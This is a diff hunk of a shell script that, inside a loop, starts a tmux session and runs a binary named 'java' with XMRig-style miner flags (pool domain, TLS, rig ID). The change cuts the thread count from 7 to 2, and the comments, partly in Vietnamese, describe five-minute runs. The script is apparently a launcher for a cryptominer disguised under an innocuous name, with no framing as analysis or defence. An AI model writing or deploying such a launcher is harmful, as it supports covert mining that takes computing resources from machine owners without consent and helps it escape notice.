@@ -39,7 +39,7 @@ while true; do
     sleep 2
     tmux new-session -s $SESSION -d
     tmux send-keys -t $SESSION "
-        $(pwd)/java/java -o $DOMAIN --tls -k -t 7 --rig-id $NAME_WORK
+        $(pwd)/java/java -o $DOMAIN --tls -k -t 2 --rig-id $NAME_WORK
     " C-m
     echo "[+] start process start process start process start process start process start process - chạy 5 phút..."
     sleep 300   # chạy 5 phút
